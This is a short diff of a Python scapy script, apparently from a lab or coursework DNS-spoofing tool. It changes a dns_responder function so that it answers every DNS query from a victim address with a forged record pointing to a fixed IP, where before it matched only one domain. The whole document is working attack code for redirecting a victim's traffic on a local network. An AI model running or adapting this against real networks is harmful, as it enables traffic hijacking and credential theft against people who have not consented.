@@ -11,8 +11,8 @@ def dns_responder(local_ip: str, victim_ip: str, router_ip: str):
             pkt[DNS].opcode == 0 and
             pkt[DNS].ancount == 0
         ):
-            if "ter.com" in str(pkt["DNS Question Record"].qname):
-                spf_resp = (IP(dst='192.168.0.107')/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname,rdata="142.232.230.10")))
+            if str(pkt["DNS Question Record"].qname):
+                spf_resp = (IP(dst=victim_ip)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname,rdata="142.232.230.10")))
                 send(spf_resp)
                 print(spf_resp.show())
                 return f"Spoofed DNS Response Sent: {pkt[IP].src}"
